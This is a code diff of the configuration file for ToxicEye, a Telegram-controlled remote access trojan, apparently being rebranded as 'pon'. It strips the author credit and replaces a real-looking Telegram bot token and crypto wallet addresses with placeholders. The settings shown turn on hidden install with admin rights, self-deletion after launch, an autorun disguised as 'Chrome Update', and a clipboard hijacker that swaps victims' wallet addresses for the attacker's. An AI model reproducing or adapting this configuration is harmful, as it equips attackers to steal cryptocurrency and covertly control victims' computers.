@@ -1,26 +1,17 @@
-﻿/* 
-       ^ Author    : LimerBoy
-       ^ Name      : ToxicEye-RAT
-       ^ Github    : https:github.com/LimerBoy
-
-       > This program is distributed for educational purposes only.
-*/
-
-
-namespace TelegramRAT
+namespace pon
 {
     internal sealed class config
     {
         // Telegram settings.
-        public const string TelegramToken = "5636410951:AAFmx2ifH5mcVcdIsTV5SyTdS2o3N-dVD-s";
-        public const string TelegramChatID = "996353333";
+        public const string TelegramToken = "You'r bot token from bofather";
+        public const string TelegramChatID = "You't chat id";
         public static int TelegramCommandCheckDelay = 1;
         // Installation to system.
         public static bool AdminRightsRequired = true;
         public static bool AttributeHiddenEnabled = true;
         public static bool AttributeSystemEnabled = true;
         public static bool MeltFileAfterStart = true;
-        public static string InstallPath = @"C:\Users\ToxicEye\rat.exe";
+        public static string InstallPath = @"C:\Users\pon\pon.exe";
         // Add to startup.
         public static bool AutorunEnabled = true;
         public static string AutorunName = "Chrome Update";
@@ -64,8 +55,8 @@ namespace TelegramRAT
         // Clipper is enabled
         public static bool ClipperEnabled = true;
         // Your wallet addresses
-        public static string bitcoin_address = "1DJ5VetDBuQnmDZjRHRgEiCwYwvc6PSwu8";
-        public static string etherium_address = "0x357C0541F19a7755AFbF1CCD824EE06059404238";
-        public static string monero_address = "42Pwy6Xe4mPTz3mLap7AB5Jjd9NBt1MWjiqyvEFx3Fn8Fo9cRw9aJUHE1iTXEpUbQacMNiSxYejBKFE7UdGnyEncEECJey9";
+        public static string bitcoin_address = "Adress";
+        public static string etherium_address = "Adress";
+        public static string monero_address = "Adress";
     }
 }
